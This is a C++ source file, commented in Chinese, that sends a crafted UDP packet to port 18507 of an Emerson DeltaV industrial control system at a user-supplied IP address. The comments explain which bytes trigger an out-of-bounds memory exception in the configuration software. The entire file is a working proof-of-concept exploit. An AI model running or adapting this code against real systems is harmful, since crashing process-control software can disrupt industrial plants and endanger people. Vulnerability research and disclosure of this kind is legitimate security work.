
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <iostream>

using namespace std;

#pragma comment(lib,"ws2_32.lib")

#pragma pack(1)
typedef struct
{
	unsigned short flag;
	unsigned short size;
	unsigned short cmd;
	unsigned short seq;
	unsigned int tickcnt;
	unsigned char v1;
	unsigned char valid;
	unsigned char v2;
	unsigned char v3;
}EMERSON_PACK_HDR;
#pragma pack()



int main(int argc, char** argv)
{
	if (argc < 2)
	{
		printf("Usage:Emerson.exe 10.4.0.6\r\n");
		printf("使用方法:Emerson.exe 10.4.0.6\r\n");
		printf("Emerson.exe是本程序编译出来的可执行文件名，10.4.0.6是DeltaV的ip地址\r\n");
		return -1;
	}

	int result = 0;

	WSADATA wsa = { 0 };
	result = WSAStartup(0x0202, &wsa);

	SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	sockaddr_in saServer = { 0 };
	saServer.sin_port = ntohs(18507);
	saServer.sin_family = AF_INET;
	saServer.sin_addr.S_un.S_addr = inet_addr(argv[1]);

	char* sendbuf = new char[0x10000];
	//填充值，该值发送给组态软件后，某些偏移的值会被当做内存地址的值参与运算并保留，导致下次访问时发生内存越界异常
	memset(sendbuf, 0xff, 0x1000);

	EMERSON_PACK_HDR* lphdr = (EMERSON_PACK_HDR*)sendbuf;
	lphdr->flag = ntohs(0xface);
	lphdr->cmd = ntohs(7);
	lphdr->size = ntohs(1456 - 16);
	lphdr->valid = 0;

	WORD* lpw = (WORD*)(sendbuf + 16);

	//除了第20，21字节的word值和lpw指向的值，其他值都参与运算但都是可以忽略的，不影响基本运行逻辑
	sendbuf[18] = 1;

	sendbuf[14] = 1;

	sendbuf[15] = ~4;

	//此值必须不为0，否则无法触发异常
	sendbuf[20] = 0xff;
	sendbuf[21] = 0xff;

	sendbuf[22] = 0xff;
	sendbuf[23] = 0xff;

	int subcmd = 0x19;	//0x19 9

	//从数据包第24字节开始的dword作为ip地址，填充从RtDeviceConnectionClassDataP+ 44629开始的0xffff个dword数组
	*lpw = ntohs(subcmd);

	int len = sendto(s, (char*)sendbuf, 1456, 0, (sockaddr*)&saServer, sizeof(sockaddr));
	if (len <= 0) {
		printf("sendto error,may be destination was not available\r\n");
	}

	delete []sendbuf;

	closesocket(s);

	WSACleanup();

	return 0;
}